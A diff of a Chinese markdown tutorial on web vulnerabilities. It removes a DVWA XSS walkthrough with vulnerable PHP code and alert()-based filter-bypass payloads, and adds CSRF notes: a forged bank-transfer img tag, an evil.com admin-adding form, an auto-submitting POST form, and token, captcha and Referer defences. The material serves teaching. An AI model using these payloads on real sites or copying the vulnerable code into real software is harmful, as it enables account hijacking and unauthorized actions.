@@ -1,618 +1,102 @@
-# WEB漏洞 
-如果网站存在WEB漏洞并被黑客攻击者利用，攻击者可以轻易控制整个网站，并可进一步提权获取网站服务器权限，控制整个服务器。主要有以下几种攻击方法：
+# 0x00 CSRF漏洞 
+CSRF (Cross Site Request Forgery)，中文全称跨站点请求伪造
 
-- 1.SQL注入
-- 2.XSS跨站点脚本
-- 3.跨目录访问
-- 4.缓冲区溢出
-- 5.cookies修改
-- 6.Http方法篡改
-- 7.CSRF
-- 8.CRLF
-- 9.命令行注入
+- 1.对网站管理员进行攻击
+- 2.修改受害网站上的用户账户和数据
+- 3.账户劫持
+- 4.传播CSRF蠕虫进行大规模攻击
+- 5.利用csrf进行拖库
+- 6.利用其他漏洞进行组合拳攻击
+- 7.针对路由器的csrf攻击
 
 ----------
 
+# 0x01 CSRF的形成原理危害
 
-## Xss
+- 案例一
+一个银行站点存在一个csrf漏洞，用户A转账给B用户2000元，执行转账操作后会对银行发送一次请求：http://www.bank.com/money?user=A&num=2000&transfer=B，然后A用户就会把自己的2000元转到B的账户下。在发送这个请求给银行服务器时，服务器首先会验证这个请求是否为一个合法的session，并且用户A确认登陆才可以验证通过。如果此时有一个恶意用户C想把A用户的钱转到自己的账户下，那么他可以构造 http://www.bank.com/money?user=A&num=2000&transfer=C 这个请求，但是这个请求必须有A用户发出才可以生效，此时恶意用户C可以搭建一个自己的网站，在网站中写入如下代码 <img src="http://www.bank.com/money?user=A&num=2000&transfer=C">,之后诱导A用户访问自己的网站，当A访问这个网站时，这个网站就会把img标签里的URL发给银行服务器，而此时除了这个请求以外，还会把A用户的cookie一起发到服务器，如果此时A用户的浏览器与银行的session没有过期，那么就会在A用户毫不知情的情况下执行转账给C的操作。
 
-### Xss的形成原理
+- 案例二
+一个cms系统的管理后台，可以发送一个post请求添加一个管理员，由于没有加token或者验证码限制，恶意攻击者可以在自己的服务器evil.com上建立一个a.html的文件，a.html文件是一个添加管理员账户的表单，上面写入需要添加的账户用户名及密码，当网站管理员打开evil.com/a.html的时候，并且管理员的session没有失效，那么此时a.html就会请求受攻击网站，在管理员毫不知情的情况下添加一个后台账户。
 
-xss中文名是“跨站脚本攻击”，英文名“Cross Site Scripting”。xss也是一种注入攻击，当web应用对用户输入过滤不严格，攻击者写入恶意的脚本代码（HTML、JavaScript）到网页中时，如果用户访问了含有恶意代码的页面，恶意脚本就会被浏览器解析执行导致用户被攻击。
-常见的危害有：cookie窃取，session劫持，钓鱼攻击，蠕虫，ddos等。
 
-### Xss的分类
-- 反射型: 反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss”。
+- 结论
  
-- 存储型: 存储型xss一出现在网站留言板，评论处，个人资料处，等需要用户可以对网站写入数据的地方。比如一个论坛评论处由于对用户输入过滤不严格，导致攻击者在写入一段窃取cookie的恶意JavaScript代码到评论处，这段恶意代码会写入数据库，当其他用户浏览这个写入代码的页面时，网站从数据库中读取恶意代码显示到网页中被浏览器执行，导致用户cookie被窃取，攻击者无需受害者密码即可登录账户。所以也被称作“持久性xss”。持久性xss比反射型xss危害要大的多。
-
-- DOM型: DOM xss是基于dom文档对象模型，前端脚本通过dom动态修改页面，由于不与服务端进行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。
-常见的可以操纵dom的对象：URL，localtion,referrer等
-
-----------
-
-### 代码案例分析
-
-#### 反射型Xss
-
-----------
+	通过以上两个案例可以得出结论，csrf会根据业务功能场景的不用而利用起来也不同，这些请求都是跨域发起的，而且是在受害者的session没有失效通过身份认证的情况下发生的。	
+	使用用户的登陆凭证，让用户自己在不知情的情况下，进行修改数据的操作。
+	但是查询数据的地方却不需要保护，因为csrf是借助受害者的cookie来进行攻击者需要的恶意操作的，攻击者并不能拿到受害者cookie，对于服务器返回的结果也无法解析查看，攻击者唯一可以做的就是让服务器执行自己的操作命令，或者说改变网站数据，而查询操作即不会改变数据也不会把结果返回给攻击者，所以并不需要保护。
 
 
-1.Low Reflected XSS Source
-
-- 漏洞代码
-
-    	<?php
-    		header ("X-XSS-Protection: 0");
-    	
-    		// Is there any input?
-    		if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
-    
-    		// Feedback for end user
-    		echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
-    		}
-    
-    	?> 
+#0x02  CSRF的分类
 
 
-
-
-- 分析与利用
-
-	直接通过$_GET方式获取name的值，之后未进行任何编码和过滤，导致用户输入一段js脚本会执行。
-
-- 构造payload
-
-	`	
-	<script>alert(/xss/)</script>
-	`
-
-
-
-----------
-
-2.Medium Reflected XSS Source
-
-- 漏洞代码
-
-		<?php
-			header ("X-XSS-Protection: 0");
-
-			// Is there any input?
-			if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
-
-			// Get input
-			$name = str_replace( '<script>', '', $_GET[ 'name' ] );
-			
-			// Feedback for end user
-			echo "<pre>Hello ${name}</pre>";
-			}
-		
-		?> 
-
-
-- 分析与利用
-
-	str_replace对输入的 `<script>` 标签进行替换为空
-
-- 构造payload
+## GET类型的CSRF
 	
-	
-	1. 此时可以多写入一个`<script>`, 过滤方法把中间的`<script>`标签替换为空之后 `<scrip` 与 `t>` 重新组合一个`<script>`，成功执行代码
-	2. 标签转换大小写的方式进行绕过 `<scRipt>alert(/xss2/)</sCript>`
-	3. 构造别的标签 如`<img src=0 onerror=alert(/xss1/)>`
-	4. 前端是可以插入一些注释标签的，后台可能不认识`<scri<!--test-->pt`>,并不会认为只是`<script>`标签
+- 这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：
 
+	`<img src=http://wooyun.org/csrf.php?xx=11 /> `
 
-----------
-
-3.High Reflected XSS Source
-
-- 漏洞代码
+	在访问含有这个img的页面后，成功向http://wooyun.org/csrf.php?xx=11发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。
  
-		<?php
-		
-			header ("X-XSS-Protection: 0");
-			
-			// Is there any input?
-	
-			if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
 
-			// Get input
-			$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
-			
-			// Feedback for end user
-			echo "<pre>Hello ${name}</pre>";
-			}
-		?>
+## POST类型的CSRF
 
-- 分析与利用
-
-	preg_replace执行一个正则表达式的搜索和替换，这时候不论是大小写、双层 `<script>` 都无法绕过，此时可以使用别的标签，比如刚刚使用过的 `<img>`
-
-- 构造payload
-	
-	
-	1. 构造别的标签 如 `<img src=0 onerror=alert(/xss/)>`
-	2. URL变化为: <http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D0+onerror%3Dalert(%2Fxss%2F)%3E#>
-
-
-----------
-
-4.Impossible Reflected XSS Source
-
-- 漏洞代码
- 
-		<?php
-
-			// Is there any input?
-			if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
-
-		    // Check Anti-CSRF token
-		    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
-		
-		    // Get input
-		    $name = htmlspecialchars( $_GET[ 'name' ] );
-		
-		    // Feedback for end user
-		    echo "<pre>Hello ${name}</pre>";
-			}
-		
-			// Generate Anti-CSRF token
-			generateSessionToken(); 
-		?>
-
-- 分析与利用
-
-	`Htmlspecialchars()` 方法将用户输入的特殊字符转换为 HTML 实体，< > “ ‘ &等字符会被转换。
-
-	![avatar](https://img-blog.csdnimg.cn/20190501103620984.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzUzNDU0OQ==,size_16,color_FFFFFF,t_70)
-
-	 `user_token` 和 `session_token`，这是防csrf的，因为经常是xss+csrf结合攻击
-
-- 构造payload
-	
-	
-	1. 此处不存在xss漏洞
-
-
-----------
-
-
-### 代码案例分析
-
-#### 存储型Xss
-
-----------
-
-
-1.Low Stored XSS Source
-
-- 漏洞代码
-
-    	<?php
-    		if( isset( $_POST[ 'btnSign' ] ) ) {
-		    // Get input
-		    $message = trim( $_POST[ 'mtxMessage' ] );
-		    $name    = trim( $_POST[ 'txtName' ] );
-		
-		    // Sanitize message input
-		    $message = stripslashes( $message );
-		    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-		
-		    // Sanitize name input
-		    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-		
-		    // Update database
-		    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
-		    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
-		
-		    //mysql_close();
-		} 
+- 这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：
     
-    	?> 
-
-
-
-
-- 分析与利用
-
-	直接通过 `$_GET` 方式获取name的值，之后未进行任何编码和过滤，导致用户输入一段js脚本会执行。
-	
-    `trim(string,charlist)` # 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格
-    可选参数charlist支持添加额外需要删除的字符。
-
-	`stripslashes()` # 去掉反斜杠
-	
-	`isset()`    # 检测变量是否设置，并且不是 NULL。 
-
-	`is_object()`  # 检测变量是否是一个对象  
-
-	`$GLOBALS["___mysqli_ston"]`  # 相当于数据库连接 `link=(GLOBALS[“___mysqli_ston”] = mysqli_connect(hostname,username, $pwd));`
-
-	`mysqli_real_escape_string()`  # 转义特殊字符，比如转义单引号，防止影响$sql语句的闭合
-
-	**最终未对用户输入数据进行xss检测编码，直接写入到数据库中，于是造成存储型xss漏洞。**
-
-
-
-- 构造payload
-
-	`	
-	<script>alert(/xss/)</script>
-	`
-
-
-
-----------
-
-2.Medium Stored XSS Source
-
-- 漏洞代码
-
-    	<?php
-			if( isset( $_POST[ 'btnSign' ] ) ) {
-			    // Get input
-			    $message = trim( $_POST[ 'mtxMessage' ] );
-			    $name    = trim( $_POST[ 'txtName' ] );
-			
-			    // Sanitize message input
-			    $message = strip_tags( addslashes( $message ) );
-			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			    $message = htmlspecialchars( $message );
-			
-			    // Sanitize name input
-			    $name = str_replace( '<script>', '', $name );
-			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			
-			    // Update database
-			    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
-			    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
-			
-			    //mysql_close();
-			} 
+        <form action=http://wooyun.org/csrf.php method=POST>
+    		<input type="text" name="xx" value="11" />
+    	</form>
+    	<script> document.forms[0].submit(); </script> 
     
-    	?> 
-
-
-
-
-- 分析与利用
-
-	直接通过$_GET方式获取name的值，之后未进行任何编码和过滤，导致用户输入一段js脚本会执行。
-
-- 构造payload
-
-	`	
-	<script>alert(/xss/)</script>
-	`
-
-
-
-----------
-
-2.Medium Stored XSS Source
-
-- 漏洞代码
-
-    	<?php
-			if( isset( $_POST[ 'btnSign' ] ) ) {
-			    // Get input
-			    $message = trim( $_POST[ 'mtxMessage' ] );
-			    $name    = trim( $_POST[ 'txtName' ] );
-			
-			    // Sanitize message input
-			    $message = strip_tags( addslashes( $message ) );
-			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			    $message = htmlspecialchars( $message );
-			
-			    // Sanitize name input
-			    $name = str_replace( '<script>', '', $name );
-			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			
-			    // Update database
-			    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
-			    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
-			
-			    //mysql_close();
-			} 
     
-    	?> 
-
-
-
-
-- 分析与利用
-
-	`$message = htmlspecialchars( $message )`  # `message` 对用户输入数据进行编码转换，因此不存在xss漏洞
-		
-	`$name = str_replace( '<script>', '', $name );`  # `str_replace`方法把`<script>`替换为空,存在三种方法绕过
-	
-
-- 构造payload
-
-	**1.非`<script>`标签**
-
-	`<img src=0 onerror=alert(/xss1/)>`
-
-	**2.大小写转换**
-		
-    `<Script>alert(/xss2/)</sCript>`
-
-	**3.双重`<script>`标签**
-
-    `<sc<script>ript>alert(/xss3/)</script>`
+	访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。
 
 ----------
 
-3.High Stored XSS Source
+#0x03  CSRF的防范
 
-- 漏洞代码
+----------
 
-    	<?php
-			if( isset( $_POST[ 'btnSign' ] ) ) {
-			    // Get input
-			    $message = trim( $_POST[ 'mtxMessage' ] );
-			    $name    = trim( $_POST[ 'txtName' ] );
-			
-			    // Sanitize message input
-			    $message = strip_tags( addslashes( $message ) );
-			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			    $message = htmlspecialchars( $message );
-			
-			    // Sanitize name input
-			    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
-			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			
-			    // Update database
-			    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
-			    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
-			
-			    //mysql_close();
-			} 
+## 验证码
+
+- CSRF攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了CSRF攻击。
+
+## 检测refer
+
+- 常见的互联网页面与页面之间是存在联系的，比如你在www.baidu.com应该是找不到通往www.google.com的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的Referer中
+
+- 通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到Referer的值，所以Refere Check 一般用于监控CSRF攻击的发生，而不用来抵御攻击.
+
+- 另一种情况是csrf结合xss进行攻击，此时就不需要跨域发起，也可以绕过referer验证。 
+
+## Token
+
+目前主流的做法是使用Token抵御CSRF攻击。下面通过分析CSRF 攻击来理解为什么Token能够有效?
+在说token如何防御csrf攻击之前，我们先了解下token的工作原理。当用户第一次进行登陆的时候，客户端会通过用户名和密码去请求服务器登陆，服务端在收到请求后会验证客户端传来的用户名和密码，如果验证通过，服务器就会签发一个token发给客户端，并且将token放到session中，客户端收到token后存储到本地，以后客户端只要每次请求服务器就要带上token，经过服务器验证通过后才会返回响应数据，否则报错。
+
+- CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。
+
+- 另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。
+
+
+- **Token 使用原则**
+
+    	Token要足够随机————只有这样才算不可预测
+
+    	Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度
+
+    	Token要注意保密性————敏感操作使用post，防止Token出现在URL中
     
-    	?> 
 
 
 
 
-- 分析与利用
 
-		
-	`$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );`   # `preg_replace` 执行一个正则表达式的搜索和替换，此时可以使用别的标签`<img> <a> <iframe>` 等，比如刚刚使用过的`<img>`
 
-- 构造payload
 
-	`	
-	<img src=0 onerror=alert(/xss/)>
-	`
 
 
 
-----------
-
-4.Impossible Stored XSS Source
-
-- 漏洞代码
-
-    	<?php
-			if( isset( $_POST[ 'btnSign' ] ) ) {
-			    // Check Anti-CSRF token
-			    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
-			
-			    // Get input
-			    $message = trim( $_POST[ 'mtxMessage' ] );
-			    $name    = trim( $_POST[ 'txtName' ] );
-			
-			    // Sanitize message input
-			    $message = stripslashes( $message );
-			    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			    $message = htmlspecialchars( $message );
-			
-			    // Sanitize name input
-			    $name = stripslashes( $name );
-			    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
-			    $name = htmlspecialchars( $name );
-			
-			    // Update database
-			    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
-			    $data->bindParam( ':message', $message, PDO::PARAM_STR );
-			    $data->bindParam( ':name', $name, PDO::PARAM_STR );
-			    $data->execute();
-			}
-			
-			// Generate Anti-CSRF token
-			generateSessionToken(); 
-    
-    	?> 
-
-
-
-
-- 分析与利用
-
-	`htmlspecialchars()`存在,此处没有漏洞,如果 `htmlspecialchars()` 使用不当,可以通过编码来绕过
-
-- 构造payload
-
-	`	
-	无
-	`
-
-
-
-----------
-
-### 代码案例分析
-
-#### DOM型Xss
-
-----------
-
-
-1.Low DOM XSS Source
-
-- 漏洞代码
-
-    	<?php
-    	
-			 # No protections, anything goes
- 
-    	?> 
-
-
-
-
-- 分析与利用
-
-	由于未做任何安全校验，直接构造payload
-
-- 构造payload
-
-	<http://localhost:8080/dvwa/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(1)%3C/script%3E>
-
-
-
-----------
-
-2.Medium DOM XSS Source
-
-- 漏洞代码
-
-    	<?php
-			
-			// Is there any input?
-			if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
-				$default = $_GET['default'];
-				
-				# Do not allow script tags
-				if (stripos ($default, "<script") !== false) {
-					header ("location: ?default=English");
-					exit;
-				}
-			}
-			 
-    	?> 
-
-- DOM
-
-		<p>Please choose a language:</p>
-			 
-		<form name="XSS" method="GET">
-			<select name="default">
-				<script>
-					if (document.location.href.indexOf("default=") >= 0) {
-						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
-						document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
-						document.write("<option value='' disabled='disabled'>----</option>");
-					}
-
-						document.write("<option value='English'>English</option>");
-						document.write("<option value='French'>French</option>");
-						document.write("<option value='Spanish'>Spanish</option>");
-						document.write("<option value='German'>German</option>");
-				</script>
-			</select>
-			<input type="submit" value="Select" />
-		</form>
-	
-
-- 分析与利用
-
-	`array_key_exists()`  # 检查数组里是否有指定的键名或索引，并且default值不为null。
-
-	`stripos()` # 返回 default 中字符串`<script>`首次出现的位置,（不区分大小写）如果未发现返回false。且进入header跳转。 此时`<script>` 标签不再可用，可以尝试别的标签 如： `<img>` , 先闭合 `</option></select>` 标签，
-
-- 构造payload
-
-	<http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English%3E%3E/option%3E%3C/select%3E%3Cimg%20src=%27x%27%20onerror=%27alert(1)%27%3E>
-
-	
-
-----------
-
-3.High DOM XSS Source
-
-- 漏洞代码
-
-    	<?php
-    	
-			// Is there any input?
-			if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
-			
-				# White list the allowable languages
-				switch ($_GET['default']) {
-					case "French":
-					case "English":
-					case "German":
-					case "Spanish":
-						# ok
-						break;
-					default:
-						header ("location: ?default=English");
-						exit;
-				}
-			}
- 
-    	?> 
-
-
-- DOM
-
-		<p>Please choose a language:</p>
-			 
-		<form name="XSS" method="GET">
-			<select name="default">
-				<script>
-					if (document.location.href.indexOf("default=") >= 0) {
-						var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
-						document.write("<option value='" + lang + "'>" + lang + "</option>");
-						document.write("<option value='' disabled='disabled'>----</option>");
-					}
-
-						document.write("<option value='English'>English</option>");
-						document.write("<option value='French'>French</option>");
-						document.write("<option value='Spanish'>Spanish</option>");
-						document.write("<option value='German'>German</option>");
-				</script>
-			</select>
-			<input type="submit" value="Select" />
-		</form>
-	
-
-
-- 分析与利用
-
-	以上逻辑代码只要不符合`case`，进入 `default `语句，在`?default=English` 设置#字符，因为#之后的字符串不会被发送到服务器上
-
-	输入的参数并没有进行URL解码,直接赋值给option标签
-
-- 构造payload
-
-	<http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert(1)%3C/script%3E>
-
-----------
-
-4.Impossible DOM XSS Source
-
-- 漏洞代码
-
-    	<?php
-    	
-			# Don't need to do anything, protction handled on the client side
- 
-    	?> 
-
-
-
-
-- 分析与利用
-
-	注释写的是保护的代码在客户端的里面
-
-- 构造payload
-
-	无
 
 
 
